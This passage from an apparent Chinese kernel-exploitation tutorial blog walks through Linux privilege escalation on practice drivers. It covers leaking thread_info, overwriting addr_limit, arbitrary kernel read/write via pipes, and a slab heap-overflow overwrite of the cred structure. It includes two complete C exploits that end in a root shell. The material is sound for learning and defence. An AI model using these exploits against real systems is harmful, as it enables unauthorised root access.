+<p>利用 程序的局部变量的地址 （<code>&amp;retval</code>） 获得内核栈的地址。又因为 <code>thread_info</code> 位于内核栈顶部而且是 <code>8k</code> （或者 <code>4k</code> ） 对齐的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">union thread_union &#123;</div><div class="line">      struct thread_info thread_info;</div><div class="line">      unsigned long stack[THREAD_SIZE/sizeof(long)];</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180423214248-35dabfd0-46fc-1.png" alt="image.png"></p>
+<p>所以利用 <strong>栈地址 &amp; (~(THREAD_SIZE - 1))</strong> 就可以计算出 <code>thread_info</code> 的地址。</p>
+<p><code>THREAD_SIZE</code> 可以为  <code>4k</code>,  <code>8k</code> 或者是 <code>16k</code> 。</p>
+<p>可以在 <a href="https://elixir.bootlin.com/linux/v4.4.73/ident/THREAD_SIZE" target="_blank" rel="external">Linux 源代码</a> 里面搜索。</p>
+<p>x86_64 定义在 <a href="https://elixir.bootlin.com/linux/v4.4.73/source/arch/x86/include/asm/page_64_types.h#L11" target="_blank" rel="external">arch/x86/include/asm/page_64_types.h</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">#ifdef CONFIG_KASAN</div><div class="line">#define KASAN_STACK_ORDER 1</div><div class="line">#else</div><div class="line">#define KASAN_STACK_ORDER 0</div><div class="line">#endif</div><div class="line"></div><div class="line">#define THREAD_SIZE_ORDER	(2 + KASAN_STACK_ORDER)</div><div class="line">#define THREAD_SIZE  (PAGE_SIZE &lt;&lt; THREAD_SIZE_ORDER)// 左移 2， 页大小为 4k, 所以是 16k</div><div class="line">#define CURRENT_MASK (~(THREAD_SIZE - 1))</div></pre></td></tr></table></figure>
+<p><code>PAGE_SIZE</code> 为 <code>4096</code> , <code>THREAD_SIZE_ORDER</code> 为 <code>2</code> , 所以 <code>THREAD_SIZE= 4 * 4096=0x4000</code></p>
+<p>所以 <strong>(~(THREAD_SIZE - 1))</strong>  为 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; hex(~(0x4000-1)&amp;0xffffffffffffffff)</div><div class="line">&apos;0xffffffffffffc000L&apos;</div></pre></td></tr></table></figure>
+<p>所以 <code>thread_info</code> 的地址就是 <code>p_stack&amp;0xFFFFFFFFFFFFC000</code> , 然后利用 <code>put_user</code> 传递给 用户态。</p>
+<h4 id="修改-thread-info-gt-addr-limit"><a href="#修改-thread-info-gt-addr-limit" class="headerlink" title="修改 thread_info-&gt;addr_limit"></a>修改 thread_info-&gt;addr_limit</h4><p> <code>thread_info-&gt;addr_limit</code> 用于限制用户态程序能访问的地址的最大值，如果把它修改成 <code>0xffffffffffffffff</code> ，我们就可以读写整个内存空间了 包括 <strong>内核空间</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">struct thread_info &#123;</div><div class="line">	struct task_struct	*task;		/* main task structure */</div><div class="line">	__u32			flags;		/* low level flags */</div><div class="line">	__u32			status;		/* thread synchronous flags */</div><div class="line">	__u32			cpu;		/* current CPU */</div><div class="line">	mm_segment_t		addr_limit;</div><div class="line">	unsigned int		sig_on_uaccess_error:1;</div><div class="line">	unsigned int		uaccess_err:1;	/* uaccess failed */</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+<p>在 <code>thread_info</code> 偏移 <code>0x18</code> （64位）处就是 <code>addr_limit</code> ， 它的类型为 <code>long</code>。</p>
+<p>在驱动的源码中，<strong>模拟</strong>修改 了  <code>thread_info-&gt;addr_limit</code>  的操作，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">memset(&amp;info-&gt;addr_limit, 0xff, 0x8);</div></pre></td></tr></table></figure>
+<p>执行完后，我们就可以读写任意内存了。</p>
+<h4 id="利用-pipe-实现任意地址读写"><a href="#利用-pipe-实现任意地址读写" class="headerlink" title="利用 pipe 实现任意地址读写"></a>利用 pipe 实现任意地址读写</h4><p>修改   <code>thread_info-&gt;addr_limit</code>  后，我们还不能直接的进行任意地址读写，需要使用 <code>pipe</code> 来中转一下，具体的原因以后再研究。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">int pipefd[2];</div><div class="line">//dest 数据的写入位置， src 数据来源， size 大小</div><div class="line">int kmemcpy(void *dest, void *src, size_t size)</div><div class="line">&#123;</div><div class="line">    write(pipefd[1], src, size);</div><div class="line">    read(pipefd[0], dest, size);</div><div class="line">    return size;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>先用 <code>pipe(pipefd)</code> 初始化好 <code>pipefd</code> ， 然后使用 <code>kmemcpy</code> 就可以实现任意地址读写了。</p>
+<blockquote>
+<p>如果是泄露内核数据的话， <code>dest</code> 为 内核地址， <code>src</code> 为 内核地址，同时要关闭 <code>smap</code></p>
+<p>如果是对内核数据进行写操作， <code>dest</code> 为 内核地址， <code>src</code> 为 用户态地址</p>
+</blockquote>
+<h4 id="修改-task-struct-gt-real-cred"><a href="#修改-task-struct-gt-real-cred" class="headerlink" title="修改 task_struct-&gt;real_cred"></a>修改 task_struct-&gt;real_cred</h4><p>我们现在已经有了<code>thread_info</code> 的地址，而且可以对内核进行任意读写，于是通过 修改  <code>task_struct-&gt;real_cred</code> 和 <code>task_struct-&gt;cred</code> 进行提权。</p>
+<ul>
+<li>首先通过 <code>thread_info</code> 的地址，拿到 <code>task_struct</code> 的地址 （ <code>thread_info-&gt;task</code>)</li>
+<li>通过  <code>task_struct-&gt;real_cred</code> 和 <code>task_struct-&gt;cred</code>相对于 <code>task_struct</code> 的偏移，拿到 它们的地址.</li>
+<li>修改  <code>task_struct-&gt;real_cred</code>  中从开始 一直 到 <code>fsuid</code> 字段（大小为 <code>0x1c</code>) 为 <code>0</code>.</li>
+<li>修改 <code>task_struct-&gt;cred =  task_struct-&gt;real_cred</code></li>
+<li>执行 <code>system(&quot;sh&quot;)</code>, 获取 <code>root</code> 权限的 <code>shell</code></li>
+</ul>
+<blockquote>
+<p><code>gdb</code>中获取 <code>real_cred</code> 的偏移</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; p &amp;((struct task_struct*)0)-&gt;real_cred</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>完整 <code>exp</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;sys/ioctl.h&gt;</div><div class="line">struct param</div><div class="line">&#123;</div><div class="line">    size_t len;</div><div class="line">    char* buf;</div><div class="line">    char* addr;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">int pipefd[2];</div><div class="line"></div><div class="line">int kmemcpy(void *dest, void *src, size_t size)</div><div class="line">&#123;</div><div class="line">    write(pipefd[1], src, size);</div><div class="line">    read(pipefd[0], dest, size);</div><div class="line">    return size;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    int fd;</div><div class="line">    char buf[16];</div><div class="line"></div><div class="line">    fd = open(&quot;/dev/arw&quot;, O_RDWR);</div><div class="line">    if (fd == -1) &#123;</div><div class="line">        printf(&quot;open hello device failed!\n&quot;);</div><div class="line">        return -1;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    struct param p;</div><div class="line">    ioctl(fd, 5, &amp;p);</div><div class="line">    printf(&quot;got thread_info: %p\n&quot;, p.addr);</div><div class="line">    char * info = p.addr;</div><div class="line">    int ret_val = pipe(pipefd);</div><div class="line">    if (ret_val &lt; 0) &#123;</div><div class="line">        printf(&quot;pipe failed: %d\n&quot;, ret_val);</div><div class="line">        exit(1);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    kmemcpy(buf, info, 16);</div><div class="line">    void* task_addr = (void *)(*(long *)buf);</div><div class="line">    //p &amp;((struct task_struct*)0)-&gt;real_cred</div><div class="line">    // 0x5a8</div><div class="line">    kmemcpy(buf, task_addr+0x5a8, 16);</div><div class="line">    char* real_cred = (void *)(*(long *)buf);</div><div class="line">    printf(&quot;task_addr: %p\n&quot;, task_addr);</div><div class="line">    printf(&quot;real_cred: %p\n&quot;, real_cred);</div><div class="line">    char* cred_ids = malloc(0x1c);</div><div class="line">    memset(cred_ids, 0, 0x1c);</div><div class="line">    // 修改 real_cred </div><div class="line">    kmemcpy(real_cred, cred_ids, 0x1c);</div><div class="line">    // 修改 task-&gt;cred = real_cred</div><div class="line">    kmemcpy(real_cred+8, &amp;real_cred, 8);</div><div class="line">    system(&quot;sh&quot;);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>运行测试</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180423214248-35e847b8-46fc-1.png" alt="image.png"></p>
+<p><code>gid</code> 和 <code>groups</code>没有为 <code>0</code>， 貌似是 <code>qemu</code> 的 特点导致的？因为它们后面的字段能被成功设置为 <code>0</code></p>
+<p><strong>参考</strong></p>
+<p><a href="http://inaz2.hatenablog.com/entry/2015/03/27/021422" target="_blank" rel="external">LinuxカーネルモジュールでStackjackingによるSMEP+SMAP+KADR回避をやってみる</a></p>
+<h3 id="利用-set-fs"><a href="#利用-set-fs" class="headerlink" title="利用 set_fs"></a>利用 <code>set_fs</code></h3><p>在内核中 <code>set_fs</code> 是一个用于设置 <code>thread_info-&gt;addr_limit</code> 的 宏，利用这个，再加上一些条件，可以直接修改 <code>thread_info-&gt;addr_limit</code> , 具体可以看 <a href="http://t.cn/RoGHAol" target="_blank" rel="external">Android PXN绕过技术研究</a></p>
+<h2 id="修改-cred提权"><a href="#修改-cred提权" class="headerlink" title="修改 cred提权"></a>修改 cred提权</h2><p>本节使用  <code>heap_bof</code> 中的代码作为示例。</p>
+<p>漏洞请看 <strong>Rop-By-Heap-Vulnerability</strong> 小结。</p>
+<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>在内核中用 <code>task_struct</code> 表示一个进程的属性， 在创建一个进程的时候同时会分配 <code>cred</code> 结构体用于标识进程的权限。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">struct cred &#123;</div><div class="line">	atomic_t	usage;</div><div class="line">#ifdef CONFIG_DEBUG_CREDENTIALS</div><div class="line">	atomic_t	subscribers;	/* number of processes subscribed */</div><div class="line">	void		*put_addr;</div><div class="line">	unsigned	magic;</div><div class="line">#define CRED_MAGIC	0x43736564</div><div class="line">#define CRED_MAGIC_DEAD	0x44656144</div><div class="line">#endif</div><div class="line">	kuid_t		uid;		/* real UID of the task */</div><div class="line">	kgid_t		gid;		/* real GID of the task */</div><div class="line">	kuid_t		suid;		/* saved UID of the task */</div><div class="line">	kgid_t		sgid;		/* saved GID of the task */</div><div class="line">	kuid_t		euid;		/* effective UID of the task */</div><div class="line">	kgid_t		egid;		/* effective GID of the task */</div><div class="line">	kuid_t		fsuid;		/* UID for VFS ops */</div><div class="line">	kgid_t		fsgid;		/* GID for VFS ops */</div><div class="line">	unsigned	securebits;	/* SUID-less security management */</div></pre></td></tr></table></figure>
+<p>提权到 <code>root</code> 除了调用 <code>commit_creds(prepare_kernel_cred(0))</code> 外，我们还可以通过 修改 <code>cred</code> 结构体中 <code>*id</code> 的字段 为<code>0</code> ，其实就是把 <code>cred</code> 结构体从开始一直到 fsuid 的所有字段全部设置为<code>0</code>， 这样也可以实现 提权到 <code>root</code> 的目的。</p>
+<h3 id="堆溢出为例"><a href="#堆溢出为例" class="headerlink" title="堆溢出为例"></a>堆溢出为例</h3><p>本节就实践一下，前面利用这个驱动的 <code>uaf</code> 漏洞，这节就利用<strong>堆溢出</strong>。</p>
+<p>要利用堆溢出就要搞清楚内核真正分配给我们的内存大小，这里 <code>cred</code> 结构体大小为 <code>0xa8</code> （编译一个内核 <code>gdb</code>查看之）， 由于向上对齐的特性内核应该会分配 <code>0xc0</code> 大小的内存块给我们，测试一下（具体代码可以看最终 <code>exp</code>)。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">// 让驱动分配 10 个 0xa8  的内存块</div><div class="line"> for (int i = 0; i &lt; 80; ++i)</div><div class="line"> &#123;</div><div class="line">     p.idx = 1;</div><div class="line">     ioctl(fds[0], 5, &amp;p);  // malloc</div><div class="line"> &#125;</div><div class="line"> printf(&quot;clear heap done\n&quot;);</div><div class="line"></div><div class="line"> // 让驱动分配 10 个 0xa8  的内存块</div><div class="line"> for (int i = 0; i &lt; 10; ++i)</div><div class="line"> &#123;</div><div class="line">     p.idx = i;</div><div class="line">     ioctl(fds[i], 5, &amp;p);  // malloc</div><div class="line"> &#125;</div></pre></td></tr></table></figure>
+<p>首先分配 <code>80</code> 个 <code>0xa8</code> 大小内存块，用于清理内存碎片，这样就可以使后续的内存分配，可以分配到连续的内存空间。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180423214248-35f67202-46fc-1.png" alt="image.png"></p>
+<p>可以看到清理内存碎片后的分配，是连续的每次分配都是相距 <code>0xc0</code> ，说明内核实际分配的内存大小就是 <code>0xc0</code>. 这 和 <code>slub</code> 机制描述的一致（分配的 <code>size</code> 向上对齐）</p>
+<p>于是利用思路就是</p>
+<ul>
+<li>首先分配 <code>80</code> 个 <code>0xa8</code> （实际是 <code>0xc0</code>) 的内存块 对内存碎片进行清理。</li>
+<li>让驱动调用几次 <code>kmalloc(0xa8, GFP_KERNEL )</code>，这会让内核分配 几个 <code>0xc0</code> 的内存块。</li>
+<li>释放中间的一个，然后调用 <code>fork</code> 会分配 <code>cred</code> 结构体，这个结构体会落入刚刚释放的那个内存块。</li>
+<li>这时溢出该内存块的前一个内存块，就可以溢出到 <code>cred</code> 结构体，然后把 一些字段设置为 <code>0</code>，就可以提权了。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;sys/mman.h&gt;</div><div class="line">#include &lt;sys/ioctl.h&gt;</div><div class="line">struct param</div><div class="line">&#123;</div><div class="line">    size_t len;    // 内容长度</div><div class="line">    char* buf;     // 用户态缓冲区地址</div><div class="line">    unsigned long idx; // 表示 ptr 数组的 索引</div><div class="line">&#125;;</div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    int fds[10];</div><div class="line">    int ptmx_fds[0x100];</div><div class="line">    char buf[8];</div><div class="line">    int fd;</div><div class="line">    for (int i = 0; i &lt; 10; ++i)</div><div class="line">    &#123;</div><div class="line">        fd = open(&quot;/dev/bof&quot;, O_RDWR);</div><div class="line">        if (fd == -1) &#123;</div><div class="line">            printf(&quot;open bof device failed!\n&quot;);</div><div class="line">            return -1;</div><div class="line">        &#125;</div><div class="line">        fds[i] = fd;</div><div class="line">    &#125;</div><div class="line">    struct param p;</div><div class="line">    p.len = 0xa8;</div><div class="line">    p.buf = malloc(p.len);</div><div class="line">    // 让驱动分配 10 个 0xa8  的内存块</div><div class="line">    for (int i = 0; i &lt; 80; ++i)</div><div class="line">    &#123;</div><div class="line">        p.idx = 1;</div><div class="line">        ioctl(fds[0], 5, &amp;p);  // malloc</div><div class="line">    &#125;</div><div class="line">    printf(&quot;clear heap done\n&quot;);</div><div class="line">    // 让驱动分配 10 个 0xa8  的内存块</div><div class="line">    for (int i = 0; i &lt; 10; ++i)</div><div class="line">    &#123;</div><div class="line">        p.idx = i;</div><div class="line">        ioctl(fds[i], 5, &amp;p);  // malloc</div><div class="line">    &#125;</div><div class="line">    p.idx = 5;</div><div class="line">    ioctl(fds[5], 7, &amp;p); // free</div><div class="line">    int now_uid;</div><div class="line">    // 调用 fork 分配一个 cred结构体</div><div class="line">    int pid = fork();</div><div class="line">    if (pid &lt; 0) &#123;</div><div class="line">        perror(&quot;fork error&quot;);</div><div class="line">        return 0;</div><div class="line">    &#125;</div><div class="line">    // 此时 ptr[4] 和 cred相邻</div><div class="line">    // 溢出 修改 cred 实现提权</div><div class="line">    p.idx = 4;</div><div class="line">    p.len = 0xc0 + 0x30;</div><div class="line">    memset(p.buf, 0, p.len);</div><div class="line">    ioctl(fds[4], 8, &amp;p);    </div><div class="line">    if (!pid) &#123;</div><div class="line">        //一直到egid及其之前的都变为了0，这个时候就已经会被认为是root了</div><div class="line">        now_uid = getuid();</div><div class="line">        printf(&quot;uid: %x\n&quot;, now_uid);</div><div class="line">        if (!now_uid) &#123;</div><div class="line">            // printf(&quot;get root done\n&quot;);</div><div class="line">            // 权限修改完毕，启动一个shell，就是root的shell了</div><div class="line">            system(&quot;/bin/sh&quot;);</div><div class="line">        &#125; else &#123;</div><div class="line">            // puts(&quot;failed?&quot;);</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    &#125; else &#123;</div><div class="line">        wait(0);</div><div class="line">    &#125;</div><div class="line">    getchar();</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+        
+                <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
+                    <p><strong>
+                         
+                            <a>本站文章均原创， 转载注明来源</a>
+                        </strong>
+                        <br>
+                        <strong>本文链接：</strong><a href="http://blog.hac425.top/2018/04/29/linux_kernel_pwn_notes.html">http://blog.hac425.top/2018/04/29/linux_kernel_pwn_notes.html</a>
+                    </p>
+                </blockquote>
+        
+    
+
+    
+</div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+    <!-- 使用 来必力 -->
+<div id="livere-comment">
+    <!-- 来必力City版安装代码 -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC8zMTQ2OC84MDMy">
+<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+</script>
+<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+<!-- City版安装代码已完成 -->
+</div>
+<style>
+    #livere-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/2018/04/23/pwn-with-glbc-heap.html" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
+
+
+                    
+                        <!-- Overlay For Active Sidebar -->
+<div class="sidebar-overlay"></div>
+
+<!-- Material sidebar -->
+<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
+    <div id="sidebar-main">
+        <!-- Sidebar Header -->
+        <div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
+    <!-- Top bar -->
+    <div class="top-bar"></div>
+
+    <!-- Sidebar toggle button -->
+    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
+        <i class="material-icons">clear_all</i>
+        <span class="mdl-button__ripple-container">
+            <span class="mdl-ripple">
+            </span>
+        </span>
+    </button>
+
+    <!-- Sidebar Avatar -->
+    <div class="sidebar-image">
+        <img src="/img/girl.png" alt="hac425's avatar">
+    </div>
+
+    <!-- Sidebar Email -->
+    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
+        hac425xxx@gmail.com
+        <b class="caret"></b>
+    </a>
+</div>
+
+
+        <!-- Sidebar Navigation  -->
+        <ul class="nav sidebar-nav">
+    <!-- User dropdown  -->
+    <li class="dropdown">
+        <ul id="settings-dropdown" class="dropdown-menu">
+            
+                <li>
+                    <a href="#" target="_blank" title="Email Me">
+                        
+                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
+                        
+                        Email Me
+                    </a>
+                </li>
+            
+        </ul>
+    </li>
+
+    <!-- Homepage -->
+    
+        <li id="sidebar-first-li">
+            <a href="/">
+                
+                    <i class="material-icons sidebar-material-icons">home</i>
+                
+                主页
+            </a>
+        </li>
+        
+    
+
+    <!-- Archives  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">inbox</i>
+                
+                    归档
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+            <li>
+                <a class="sidebar_archives-link" href="/archives/2018/04/">四月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">14</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/02/">二月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/01/">一月 2018<span class="sidebar_archives-count">8</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">13</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/11/">十一月 2017<span class="sidebar_archives-count">8</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/10/">十月 2017<span class="sidebar_archives-count">11</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/08/">八月 2017<span class="sidebar_archives-count">1</span></a>
+            </ul>
+        </li>
+        
+    
+
+    <!-- Categories  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">chrome_reader_mode</i>
+                
+                分类
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+                <li>
+                <a class="sidebar_archives-link" href="/categories/Vulnerability-analysis/">Vulnerability analysis<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/chrome/">chrome<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/ctf/">ctf<span class="sidebar_archives-count">17</span></a></li><li><a class="sidebar_archives-link" href="/categories/java应用破解思路/">java应用破解思路<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/jeb破解/">jeb破解<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/categories/kernel/">kernel<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/pwn-router-os/">pwn_router_os<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/categories/reverse/">reverse<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/代码审计/">代码审计<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/categories/安卓安全/">安卓安全<span class="sidebar_archives-count">6</span></a></li><li><a class="sidebar_archives-link" href="/categories/文件patch/">文件patch<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/渗透测试/">渗透测试<span class="sidebar_archives-count">11</span></a></li><li><a class="sidebar_archives-link" href="/categories/破解/">破解<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/路由器安全/">路由器安全<span class="sidebar_archives-count">10</span></a>
+            </ul>
+        </li>
+        
+            <li class="divider"></li>
+        
+    
+
+    <!-- Pages  -->
+    
+        <li>
+            <a href="/about" title="关于我">
+                
+                    <i class="material-icons sidebar-material-icons">person</i>
+                
+                关于我
+            </a>
+        </li>
+        
+    
+        <li>
+            <a href="/timeline" title="时间轴">
+                
+                    <i class="material-icons sidebar-material-icons">timeline</i>
+                
+                时间轴
+            </a>
+        </li>
+        
+    
+        <li>
+            <a href="/links" title="友情链接">
+                
+                    <i class="material-icons sidebar-material-icons">people</i>
+                
+                友情链接
+            </a>
+        </li>
+        
+    
+        <li>
+            <a href="/tags" title="标签云">
+                
+                    <i class="material-icons sidebar-material-icons">invert_colors</i>
+                
+                标签云
+            </a>
+        </li>
+        
+    
+
+    <!-- Article Number  -->
+    
+        <li>
+            <a href="/archives">
+                文章总数
+                <span class="sidebar-badge">60</span>
+            </a>
+        </li>
+        
+    
+</ul>
+
+
+        <!-- Sidebar Footer -->
+        <!--
+I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
+If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
+It will not impact the appearance and can give developers a lot of support :)
+
+很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
+如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
+它不会影响美观并可以给开发者很大的支持和动力。 :)
+-->
+
+<!-- Sidebar Divider -->
+
+
+<!-- Theme Material -->
+
+
+<!-- Help & Support -->
+<!--
+
+-->
+
+<!-- Feedback -->
+<!--
+
+-->
+
+<!-- About Theme -->
+<!--
+
+-->
+
+    </div>
+
+    <!-- Sidebar Image -->
+    
+
+</aside>
+
+                    
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
+
+                    
+
+                    <script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
